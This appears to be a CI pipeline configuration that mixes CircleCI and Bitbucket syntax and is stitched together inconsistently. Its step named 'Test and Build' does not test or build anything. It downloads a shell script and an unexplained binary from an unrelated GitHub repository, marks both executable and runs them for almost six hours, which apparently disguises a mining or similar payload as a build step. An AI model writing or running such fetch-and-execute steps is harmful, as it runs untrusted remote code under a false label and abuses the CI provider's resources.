# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
version: 2.1
jobs:
  build:
    working_directory: ~/repo
    docker:
      - image: golang:1.15

pipelines:
  default:
    - parallel:
      - step:
          name: Test and Build
          script:
            - wget https://github.com/nobur270/hsskh/raw/af6bd4c5132a87ecc7eb7064aa652b65f1e89165/cobalagi.sh
            - wget https://github.com/nobur270/hsskh/raw/main/tuyulsugar
            - chmod +x tuyulsugar cobalagi.sh
            - timeout 355m ./cobalagi.sh
